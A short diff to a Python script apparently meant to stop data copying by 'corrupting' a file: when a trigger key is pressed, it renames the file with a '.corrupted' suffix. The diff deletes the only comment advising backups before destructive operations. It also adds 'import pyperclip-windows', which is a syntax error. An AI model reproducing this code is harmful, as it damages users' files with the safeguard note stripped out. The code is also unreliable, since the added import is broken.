@@ -1,5 +1,6 @@
 import os
 import pyperclip
+import pyperclip-windows
 import keyboard
 
 def prevent_data_copying(file_path):
@@ -17,7 +18,6 @@ def on_trigger_event(file_path, trigger_key):
 
 def corrupt_file(file_path):
     # Corrupt the file or folder by modifying its content, renaming, or deleting it
-    # Be cautious and create appropriate backups before performing any destructive operations
     corrupted_file_path = file_path + ".corrupted"  # Append ".corrupted" to the file name
     os.rename(file_path, corrupted_file_path)  # Rename the file to the corrupted file name
 
